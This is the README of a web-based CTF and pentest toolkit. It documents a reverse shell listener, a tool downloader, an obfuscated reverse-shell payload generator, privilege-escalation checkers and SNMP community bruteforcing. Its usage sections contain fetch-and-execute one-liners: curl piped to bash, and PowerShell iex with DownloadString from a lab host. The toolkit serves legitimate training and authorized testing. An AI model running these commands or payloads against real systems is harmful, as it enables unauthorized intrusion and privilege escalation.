# CTF-Toolkit

> A comprehensive web-based toolkit for CTF challenges and penetration testing certifications

![CTF-Toolkit Interface](https://github.com/user-attachments/assets/047294b3-7c16-4c26-9a19-7dfd61fef423)

## Features

- **Web Interface**: Intuitive web-based control panel for all tools
- **Reverse Shell Management**: Receive and interact with reverse shells
- **File Transfer**: Secure file upload/download with SHA256 verification
- **Tool Management**: Built-in tool repository and management
- **Multi-Clipboard**: Share clipboard content across machines
- **Network Discovery**: Automatic IP discovery
- **Privilege Escalation Tools**: Comprehensive privesc checkers for Linux and Windows
- **SNMP Enumeration**: Automated SNMP reconnaissance with community string bruteforce
- **Rate Limiting**: Thread-safe rate limiting to prevent abuse
- **Security Headers**: XSS, clickjacking, and MIME sniffing protection

## Installation

### Prerequisites

- Python 3.9+
- Git

### Quick Start

```bash
# Clone the repository
git clone https://github.com/KermitPurple96/CTF-toolkit
cd CTF-toolkit

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate  # On Windows: .venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Run the application
python app.py
```

The web interface will be available at `http://localhost:5000`

## Configuration

CTF-Toolkit can be configured via environment variables or a `.env` file.

### Environment Variables

Copy `.env.example` to `.env` and customize:

```bash
cp .env.example .env
```

Key configuration options:

| Variable | Default | Description |
|----------|---------|-------------|
| `FLASK_HOST` | `0.0.0.0` | Host address to bind to |
| `FLASK_PORT` | `5000` | Port to listen on |
| `FLASK_DEBUG` | `False` | Enable debug mode (development only) |
| `MAX_FILE_SIZE` | `104857600` | Maximum upload size (100MB) |
| `LOG_LEVEL` | `INFO` | Logging level (DEBUG, INFO, WARNING, ERROR) |

See `.env.example` for all available options.

## Usage

### Web Interface

Access the web interface at `http://localhost:5000`:

- **Tools**: View and manage exploitation tools
- **Shells**: Start reverse shell listeners
- **Clipboards**: Share text between machines
- **IPs**: View network interfaces

### Command Line Tools

#### 1. Shell Listener

Receive reverse shell connections:

```bash
python shell.py <port>
```

Features:
- Auto OS detection (Linux/Windows)
- Built-in upload/download commands
- MD5 integrity verification
- Colored terminal output

Example:
```bash
python shell.py 443
```

Commands available in shell:
- `upload <local_file>` - Upload file to remote machine (with SHA256 verification)
- `download <remote_file>` - Download file from remote machine (with SHA256 verification)
- `help` - Show available commands
- `exit` - Close the connection

#### 2. Toolpy (Tool Management)

Download exploitation tools:

```bash
toolpy -d <tool_name>
```

Example:
```bash
toolpy -d rubeus
```

![Toolpy Example](https://github.com/user-attachments/assets/a9d69157-f2e7-4659-8885-06eb56d6e8b6)

#### 3. Shellpy (Payload Generator)

Generate obfuscated reverse shell payloads (requires [Shellpy](https://github.com/KermitPurple96/Shellpy)):

```bash
shellpy <ip> <port> [options]
```

Example:
```bash
shellpy 10.10.10.10 443 -powercat --obfuscate --macro
```

![Shellpy Example](https://github.com/user-attachments/assets/9bb1efe9-bcaa-49b8-b99b-b865b758eefe)

### Privilege Escalation Scripts

#### Linux Privilege Escalation

Download and run the privilege escalation checker:

```bash
curl http://10.10.10.10:5000/downloads/privesc_linux.sh | bash
```

Or run it locally:

```bash
./downloads/privesc_linux.sh -q   # Quick wins only
./downloads/privesc_linux.sh -f   # Full enumeration
./downloads/privesc_linux.sh -l   # Full + LinPEAS
./downloads/privesc_linux.sh -p   # Full + pspy
```

Features:
- **Quick Wins**: sudo -l, SUID binaries, capabilities, docker group, writable /etc/passwd
- **Full Enumeration**: kernel exploits, interesting files, services, polkit/PwnKit
- **LinPEAS Integration**: Automatic download and execution
- **pspy Integration**: Process monitoring
- **Organized Output**: QUICK_WINS.txt with high-priority findings
- **CTF-Focused**: Based on public CTF techniques and OSCP methodology

See `tools/PRIVESC_GUIDE.md` for complete documentation.

#### Windows Privilege Escalation

Download and run the privilege escalation checker:

```powershell
iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:5000/downloads/privesc_windows.ps1'))
```

Or run it locally:

```powershell
.\downloads\privesc_windows.ps1 -Quick   # Quick wins only
.\downloads\privesc_windows.ps1 -Full    # Full enumeration
.\downloads\privesc_windows.ps1 -WinPEAS # Full + WinPEAS
```

Features:
- **Quick Wins**: AlwaysInstallElevated, unquoted service paths, writable service binaries
- **Token Privileges**: SeImpersonatePrivilege, SeDebugPrivilege detection
- **AutoLogon Credentials**: Automatic detection
- **Scheduled Tasks**: Writable binary detection
- **WinPEAS Integration**: Automatic download and execution
- **Organized Output**: QUICK_WINS.txt with high-priority findings

### SNMP Enumeration

Automated SNMP enumeration based on OSCP methodology:

```bash
./tools/snmp_enum.sh -t 10.10.10.92 -q   # Quick scan
./tools/snmp_enum.sh -t 10.10.10.92 -f   # Full enumeration
./tools/snmp_enum.sh -t 10.10.10.92 -C /path/to/wordlist.txt  # Bruteforce communities
./tools/snmp_enum.sh -t 10.10.10.92 -a   # All techniques
```

Features:
- **Community String Bruteforce**: Using onesixtyone
- **Full SNMP Walk**: From root OID (not default OID 2)
- **Extended MIB Enumeration**: NET-SNMP-EXTEND-MIB for RCE vectors
- **Specific OID Checks**: Users, software, ports, processes, system info
- **Multiple Targets**: Support for target list files
- **Organized Output**: Separate files for each enumeration type

See `tools/SNMP_ENUMERATION_GUIDE.md` for complete documentation and OID reference.

## Architecture

### Security Features

- **Input Validation**: Comprehensive validation for all inputs
- **Path Traversal Protection**: Prevents directory traversal attacks
- **Security Headers**: XSS, clickjacking, MIME sniffing protection
- **File Size Limits**: Prevents DoS via large uploads
- **Custom Exception Hierarchy**: Proper error handling
- **Audit Logging**: All operations logged with timestamps
- **Log Injection Prevention**: Sanitized logging
- **Rate Limiting**: Thread-safe rate limiting with sliding window algorithm
- **SHA256 File Verification**: Cryptographically secure file integrity checks
- **Persistent SECRET_KEY**: Session persistence across restarts

### Project Structure

```
CTF-toolkit/
├── app.py                       # Main Flask application
├── shell.py                     # Interactive shell client
├── listen_manager.py            # Reverse shell handler
├── config.py                    # Configuration management
├── exceptions.py                # Custom exceptions
├── validators.py                # Input validation
├── security_headers.py          # Security middleware
├── rate_limiter.py              # Thread-safe rate limiting
├── logging_config.py            # Logging configuration
├── reload.py                    # Development auto-reload
├── templates/                   # HTML templates
├── static/                      # CSS, JS, images
├── tools/                       # Exploitation tools & guides
│   ├── snmp_enum.sh            # SNMP enumeration automation
│   ├── SNMP_ENUMERATION_GUIDE.md
│   └── PRIVESC_GUIDE.md        # Privilege escalation guide
├── downloads/                   # Privilege escalation scripts
│   ├── privesc_linux.sh        # Linux privesc checker
│   └── privesc_windows.ps1     # Windows privesc checker
├── uploads/                     # Uploaded files
├── logs/                        # Application logs
├── tests/                       # E2E test suite
├── CODE_REVIEW_REPORT.md        # Security analysis report
└── TODO.md                      # Future improvements
```

## Development

### Running Tests

```bash
# Run all tests
python -m pytest tests/ -v

# Run specific test category
python -m pytest tests/test_e2e_flask_server.py -v

# Run with coverage
python -m pytest tests/ --cov=. --cov-report=html
```

### Auto-Reload Development Server

```bash
python reload.py
```

This will watch `templates/` and `static/` directories and automatically reload the server on changes.

### Code Quality

The project includes:
- Type hints for all functions
- Comprehensive docstrings
- Custom exception hierarchy
- Centralized logging
- Input validation
- Security headers
- 33 E2E tests (100% passing)

## Security Considerations

### For CTF/Lab Use Only

This toolkit is designed for:
- CTF competitions
- Penetration testing labs
- Security certifications (OSCP, etc.)
- Authorized security assessments

**⚠️ Security Status:** Moderate Risk - See `CODE_REVIEW_REPORT.md`

**Suitable for:**
- ✅ CTF competitions
- ✅ Controlled lab environments
- ✅ Security training

**NOT suitable for:**
- ❌ Public internet without authentication
- ❌ Production environments without hardening
- ❌ Untrusted networks

### Security Best Practices

1. **Never expose to the internet** - Use only in isolated lab environments
2. **Set SECRET_KEY** - `export SECRET_KEY="your-secret-key-here"`
3. **Use HTTPS** - Set `USE_HTTPS=True` when deploying with TLS
4. **Review logs** - Check `logs/` directory regularly
5. **Limit access** - Use firewall rules to restrict access
6. **Check TODO.md** - Review pending security improvements

### Recent Security Improvements (2026-08-11)

- ✅ **Fixed SECRET_KEY regeneration** - Now persists across restarts
- ✅ **Replaced MD5 with SHA256** - Cryptographically secure hashing
- ✅ **Thread-safe rate limiter** - No race conditions
- ✅ **Comprehensive code review** - See `CODE_REVIEW_REPORT.md`
- 📋 **TODO.md** - Planned improvements for authentication, CSP, input validation

### Known Limitations

See `CODE_REVIEW_REPORT.md` for detailed security analysis including:
- No authentication/authorization (planned)
- Command injection vectors in shell operations (to be fixed)
- Permissive Content Security Policy (requires HTML/JS refactor)
- See `TODO.md` for complete list of planned improvements

## Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Development Guidelines

- Add type hints to all functions
- Include docstrings with Args/Returns/Raises
- Write tests for new features
- Follow existing code style
- Update README for new features

## Testing

The project includes a comprehensive E2E testing suite:

- **33 tests** covering all major functionality
- Flask endpoint testing
- File transfer testing
- Security validation testing
- Integration testing

Run tests before submitting PRs:

```bash
python -m pytest tests/ -v
```

## License

This project is provided for educational and authorized security testing purposes only.

## Credits

- Original author: [@KermitPurple96](https://github.com/KermitPurple96)
- Recon scripts: [OSCP_AuxReconTools](https://github.com/Daniel10Barredo/OSCP_AuxReconTools)
- Payload generator: [Shellpy](https://github.com/KermitPurple96/Shellpy)

## Changelog

### Version 2.0 (2026-08-11) - Security Hardening

**New Features:**
- ✨ Privilege escalation checkers for Linux and Windows
- ✨ SNMP enumeration automation with community bruteforce
- ✨ Comprehensive privilege escalation guide (PRIVESC_GUIDE.md)
- ✨ SNMP enumeration guide with OID reference
- ✨ Thread-safe rate limiting implementation

**Security Fixes:**
- 🔒 Fixed SECRET_KEY regeneration issue (now persists)
- 🔒 Replaced MD5 with SHA256 for file integrity
- 🔒 Added thread-safety to rate limiter
- 🔒 Comprehensive security code review completed

**Documentation:**
- 📚 CODE_REVIEW_REPORT.md - Complete security analysis
- 📚 TODO.md - Planned improvements and roadmap
- 📚 Updated README with new features and security status

### Version 1.0 (Previous)

- Type hints and comprehensive docstrings
- Custom exception hierarchy
- Centralized configuration system
- Input validation helpers
- Security headers middleware
- Comprehensive logging with rotation
- E2E test suite (33 tests)

## Support

For issues, questions, or feature requests, please open an issue on GitHub.

---

**⚠️ Disclaimer**: This tool is intended for authorized security testing only. Unauthorized access to computer systems is illegal. Use responsibly and only on systems you have permission to test.
